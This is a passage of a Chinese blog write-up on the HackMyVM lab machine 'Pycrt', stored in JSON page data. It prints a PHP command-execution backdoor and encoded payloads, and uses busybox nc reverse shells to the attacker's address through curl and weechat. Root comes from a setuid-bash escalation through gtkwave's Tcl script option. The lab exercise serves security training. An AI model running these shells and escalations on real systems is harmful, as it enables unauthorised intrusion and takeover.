class=\"hljs-string\"\u003e\"Nothing to see here.\"\u003c/span\u003e;\n}                                \n?\u003e                \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现不止存在\u003ccode\u003eLFI\u003c/code\u003e，还存在命令执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 存在命令执行\nelseif (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e \u0026#x26;\u0026#x26; isset(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'auth'\u003c/span\u003e]) \u0026#x26;\u0026#x26; isset(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'payload'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$auth\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'auth'\u003c/span\u003e];\n    \u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'payload'\u003c/span\u003e];\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$auth\u003c/span\u003e !== \u003cspan class=\"hljs-string\"\u003e'LetMeIn123!'\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Invalid Auth Token.'\u003c/span\u003e);\n        }                               \n                                                         \n    \u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e = decrypt(\u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e);                                                                                 \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;pre\u003e\u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e\u0026#x3C;/pre\u003e\"\u003c/span\u003e;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {                     \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Payload decode failed.\\n\"\u003c/span\u003e;\n    }                             \n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e;      \n // decrypt 函数\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e decrypt(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e) {       \n    \u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e = strrev(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);   \n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Reversed: \"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e;\n                                                         \n    \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = base64_decode(\u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Decoded: \"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e;\n                                                         \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e === \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {   \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Base64 decoding failed.\\n\"\u003c/span\u003e;\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n    }\n                                                         \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'cmd:'\u003c/span\u003e) === 0) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e substr(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, 4);\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造命令执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e -\u003e cmd:\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e -\u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e-\u003e Y21kOndob2FtaQ== -reverse-\u003e QatF2bodnOk12Y\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php -X POST -d \u003cspan class=\"hljs-string\"\u003e'auth=LetMeIn123!\u0026#x26;payload===QatF2bodnOk12Y'\u003c/span\u003e\nReversed: Y21kOndob2FtaQ==\nDecoded: cmd:\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\n\u0026#x3C;pre\u003ewww-data\u0026#x3C;/pre\u003e# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e反弹 \u003ccode\u003eshell\u003c/code\u003e （尝试了好久）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt curl http://192.168.56.58/ShadowSec/bydataset.php -X POST -d \u003cspan class=\"hljs-string\"\u003e'auth=LetMeIn123!'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"payload=\u003cspan class=\"hljs-subst\"\u003e$(echo -n 'cmd:busybox nc 192.168.56.4 1234 -e /bin/bash' | base64 | rev)\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Chatlake\u003c/h2\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@PyCrt:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on PyCrt:\n    (chatlake) NOPASSWD: /usr/bin/weechat\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接运行看看（需要对\u003ccode\u003eshell\u003c/code\u003e进行升级为交互式：\u003ca href=\"https://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/%EF%BC%89\"\u003ehttps://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/）\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现有 \u003ccode\u003eexec\u003c/code\u003e 选项\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/exec \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\n/exec \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/exec busybox nc 192.168.56.4 1234 -e /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Pycrtlake\u003c/h2\u003e\n\u003cp\u003e家目录下存在 user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003echatlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nflag{b42baba466402e32157a1cbba819664e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003echatlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e chatlake on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser chatlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003echatlake@PyCrt:~/.weechat$ find / -name irc 2\u003e/dev/null\n/usr/local/lib/python3.9/dist-packages/irc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003echatlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/systemctl start irc_bot.service\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后回到\u003ccode\u003eIrssi\u003c/code\u003e 就能看到多了 \u003ccode\u003e6\u003c/code\u003e 个频道\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看频道列表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/list\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e11:01 -!- Channel Users Name\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan2 1 [+nt] \u003c/span\u003e\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan3 1 [+nt] \u003c/span\u003e\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan4 1 [+nt] \u003c/span\u003e\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan5 1 [+nt] \u003c/span\u003e\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan6 1 [+nt] \u003c/span\u003e\n11:01 -!- \u003cspan class=\"hljs-comment\"\u003e#chan1 1 [+nt] \u003c/span\u003e\n11:01 -!- End of channel list.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进入频道\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/join chan6\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e11:02 -!- sunset [root@192.168.56.4] has joined \u003cspan class=\"hljs-comment\"\u003e#chan1\u003c/span\u003e\n11:02 [Users \u003cspan class=\"hljs-comment\"\u003e#chan1]\u003c/span\u003e\n11:02 [@admin] [ sunset] \n11:02 -!- Irssi: \u003cspan class=\"hljs-comment\"\u003e#chan1: Total of 2 nicks [1 ops, 0 halfops, 0 voices, 1 normal]\u003c/span\u003e\n11:02 -!- Channel \u003cspan class=\"hljs-comment\"\u003e#chan1 created Sun May 11 10:57:21 2025\u003c/span\u003e\n11:02 -!- Irssi: Join to \u003cspan class=\"hljs-comment\"\u003e#chan1 was synced in 7 secs\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e随便发送点东西，过了一会 \u003ccode\u003eadmin\u003c/code\u003e 发了条信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMy friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e遵守格式要求？应该是要在最后面加上 \u003ccode\u003e:)\u003c/code\u003e 来结束，不过也还是没有什么用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我TM直接私聊\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/query admin\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e不会做了，看了下 WP，是要使用之前在首页中的ID \u003ccode\u003ell104567\u003c/code\u003e ，也就是群主的 ID\u003c/p\u003e\n\u003cp\u003e加入频道发送信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后回到私聊中，会告诉你存在非法字符\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后回到频道输入 \u003ccode\u003e12345:)\u003c/code\u003e ，再回到私聊中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e11:27 \u0026#x3C;admin\u003e [!] conversion error ：[-] Number range exceeds（0-255）\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 2:)\n11:29 \u0026#x3C;admin\u003e [!] Wrong \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e unauthorized!\n// 60:)\n11:31 \u0026#x3C;admin\u003e [!] Wrong \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;'\u003c/span\u003e unauthorized!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以发现对应着 \u003ccode\u003eASCII\u003c/code\u003e 表，接着进行测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 105 100:)\n11:33 \u0026#x3C;admin\u003e [!] Wrong \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e unauthorized!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造出 \u003ccode\u003eid\u003c/code\u003e ，但是没有回显，外带测试一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有回显，进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功进行反弹，但是几秒钟之后就断掉了，所以要拼手速，反弹两次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e怪极限的…\u003c/p\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:/usr/local/bin$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e pycrtlake on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pycrtlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/gtkwave\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt: \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/gtkwave\nUsage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]\n\n  -n, --nocli=DIRPATH        use file requester \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e dumpfile name\n  -f, --dump=FILE            specify dumpfile name\n  -F, --fastload             generate/use VCD recoder fastload files\n  -o, --optimize             optimize VCD to FST\n  -a, --save=FILE            specify savefile name[0/22]\n  -A, --autosavename         assume savefile is suffix modified dumpfile name\n  -r, --rcfile=FILE          specify override .rcfile name\n  -d, --defaultskip          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e missing .rcfile, \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not use useful defaults\n  -D, --dualid=WHICH         specify multisession identifier\n  -l, --logfile=FILE         specify simulation logfile name \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e values\n  -s, --start=TIME           specify start \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e LXT2/VZT block skip\n  -e, --end=TIME             specify end \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e LXT2/VZT block skip\n  -t, --stems=FILE           specify stems file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e code annotation\n  -c, --cpu=NUMCPUS          specify number of CPUs \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e parallelizable ops\n  -N, --nowm                 \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e window manager \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e most windows\n  -M, --nomenus              \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not render menubar (\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e making applets)\n  -S, --script=FILE          specify Tcl \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e script file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e execution\n  -T, --tcl_init=FILE        specify Tcl \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e script file to be loaded on startup\n  -W, --wish                 \u003cspan class=\"hljs-built_in\"\u003eenable\u003c/span\u003e Tcl \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e line on stdio\n  -R, --repscript=FILE       specify timer-driven Tcl \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e script file\n  -P, --repperiod=VALUE      specify repscript period \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e msec (default: 500)\n  -X, --xid=XID              specify XID of window \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GtkPlug to connect to\n  -1, --rpcid=RPCID          specify RPCID of GConf session\n  -2, --\u003cspan class=\"hljs-built_in\"\u003echdir\u003c/span\u003e=DIR            specify new current working directory\n  -3, --restore              restore previous session\n  -4, --rcvar                specify single rc variable values individually\n  -5, --sstexclude           specify sst exclusion filter filename\n  -I, --interactive          interactive VCD mode (filename is shared mem ID)\n  -C, --comphier             use compressed hierarchy names (slower)\n  -g, --giga                 use gigabyte mempacking when recoding (slower)\n  -L, --legacy               use legacy VCD mode rather than the VCD recoder\n  -v, --vcd                  use stdin as a VCD dumpfile\n  -O, --output=FILE          specify filename \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e stdout/stderr redirect\n  -z, --slider-zoom          \u003cspan class=\"hljs-built_in\"\u003eenable\u003c/span\u003e horizontal slider stretch zoom\n  -V, --version              display version banner \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -h, --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e                 display this \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -x, --\u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e                 \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e after loading trace (\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e loader benchmarks)\n\nVCD files and save files may be compressed with zip or gzip.\nGHW files may be compressed with gzip or bzip2.\nOther formats must remain uncompressed due to their non-linear access.\nNote that DUMPFILE is optional \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e the --dump or --nocli options are specified.\nSAVEFILE and RCFILE are always optional.\n\nReport bugs to \u0026#x3C;bybell@rocketmail.com\u003e.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中的 \u003ccode\u003e-S\u003c/code\u003e 可以执行脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e  -S, --script=FILE          specify Tcl \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e script file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e execution\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e经过查阅发现是 \u003ccode\u003eTCL\u003c/code\u003e 语言，其中有方法可以执行命令：\u003ca href=\"https://blog.csdn.net/yudingding6197/article/details/44453933\"\u003ehttps://blog.csdn.net/yudingding6197/article/details/44453933\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e编写脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exec chmod u+s /bin/bash\"\u003c/span\u003e \u003e shell\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/gtkwave -S shell                            \nCould not initialize GTK!  Is DISPLAY \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e var/xhost \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e?\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e大概就是没有图形化而无法运行：\u003ca href=\"https://dev59.com/askubuntu/P0XXs4cB2Jgan1zn2dTY#google_vignette\"\u003ehttps://dev59.com/askubuntu/P0XXs4cB2Jgan1zn2dTY#google_vignette\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e解决方法：可以使用 \u003ccode\u003eXvfb\u003c/code\u003e 来假装一个\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e刚好靶机上有\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e Xvfb\n/usr/bin/Xvfb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:~$ Xvfb :99 -screen 0 1024x768x24 \u0026#x26;\n[1] 1678\npycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e DISPLAY=:99\npycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/gtkwave -S shell \n\nGTKWave Analyzer v3.3.118 (w)1999-2023 BSI\n\n(gtkwave:1686): dconf-WARNING **: 12:04:41.029: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)\nGTKWAVE | Use the -h, --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e line flags to display \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e.\nGTKWAVE | Executing Tcl script \u003cspan class=\"hljs-string\"\u003e'shell'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epycrtlake@PyCrt:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\npycrtlake@PyCrt:~$ /bin/bash -p\nbash-5.0# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(pycrtlake) gid=1000(pycrtlake) euid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(pycrtlake),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)\nash-5.0# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nflag{e80ecc46ca5e00bf8a51c47f0cc3e868}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e难，提示不多，不太好找路，还是太菜了…\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/Sadge-3x.png\" alt=\"Sadge-3x.png\"\u003e\u003c/p\u003e","title":"HackMyVM - Pycrt","date":"2025-05-12","updated":"2025-05-12","tags":["HackMyVM","Linux靶机","TCL","LFI","IRC"],"categories":"靶机","comments":true,"description":"Pycrt. https://hackmyvm.eu/machines/machine.php?vm=Pycrt Notes：Have Fun! 前期踩点 Web 渗透 1 常规先对 80 端口进行渗透 目录扫描什么都扫描不出来 先放着 InspIRCd InspIRCd是一个功能丰富的C++编写的..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMPycrt"},"buildId":"PcOY42qQWTyGHauCjHxUV","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>